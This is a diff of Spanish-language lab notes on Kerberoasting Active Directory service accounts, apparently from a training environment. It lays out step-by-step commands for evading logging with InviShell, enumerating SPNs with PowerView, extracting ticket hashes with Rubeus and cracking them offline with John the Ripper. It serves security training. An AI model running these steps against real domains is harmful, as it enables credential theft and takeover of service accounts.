@@ -29,16 +29,34 @@ Tags: #AD #kerberoasting
 ## Powerview
 
 ```powershell 
-! Usuario: Usuario de dominio
+! Usuario: Usuario de dominio con bajos privilegios 
 
+Paso 1:
+❯ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+❯ . .\PowerView.ps1      # Importar el módulo 
+
+Paso 2:
 ❯ Get-DomainUser -SPN
-# Enumerar cuentas de usuario con SPNs registrados, identifica cuentas de servicio candidatas para Kerberoasting.
+# Enumerar cuentas de usuario con SPNs registrados, identifica cuentas de servicio candidatas para Kerberoasting
+
+
+	# Obtener lo siguiente: 
+	displayname              : svc admin 
+	serviceprincipalname     : {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
 ```
 
 ## Rubeus 
 
+Ten en cuenta que estamos usando la opción `/rc4opsec`, la cual obtiene hashes únicamente de cuentas que soportan RC4. Esto significa que si la opción "This account supports Kerberos AES 128/256 bit encryption" está habilitada para una cuenta de servicio, el siguiente comando no solicitará sus hashes.
+
 ```powershell 
-! Usuario: Usuario de dominio
+! Usuario: Usuario de dominio 
+# Ejecutar desde un CMD como administrador local si no funciona con PS
+
+Paso 3:
+❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
+# Solicitar un TGS para el SPN asociado a la cuenta svcadmin mediante Kerberoasting, extraer el hash RC4-HMAC del ticket de servicio y guardarlo en hashes.txt para su posterior crackeo offline.
 
 ❯ Rubeus.exe kerberoast /stats
 ❯ .\Loader.exe -path C:\AD\Rubeus.exe -args kerberoast /stats
@@ -63,16 +81,24 @@ Tags: #AD #kerberoasting
 # Kerberoastear todas las cuentas posibles usando RC4_HMAC y guardar los hashes en un archivo para crackear offline.
 ```
 
-## Cracking 
+## Cracking del hash obtenido 
+
+Si Rubeus obtiene el hash de la primer manera:
+* `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*`
+
+Se debe de modificar a la segunda manera dentro de hashes.tx para el crackeo con John:
+* `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*` 
 
 ```powershell 
-! Usuario: Usuario local (atacante)
+! Usuario: Usuario local
+# Ejecutar desde una consola CMD
 
-❯ .\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt asrep_hash.txt
+Paso 4:
+❯ C:\AD\Tools\Sliver\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt hashes.txt
 # Crackear los hashes Kerberoasteados offline usando John the Ripper con un wordlist — recupera la contraseña en texto claro de la cuenta de servicio.
 
-Nota:
-	- El hash que se obtiene se debe de modificar y quitar la parte de ':1433'
+❯ C:\AD\Tools\Sliver\john-1.9.0-jumbo-1-win64\run\john.exe --show hashes.txt
+# Mirar la contraseña del hash 
 ```
 
 ```bash 
@@ -81,5 +107,3 @@ Nota:
 - CeWL
 - Bopscrk
 ```
-
-![](Pasted%20image%2020260420172517.png)
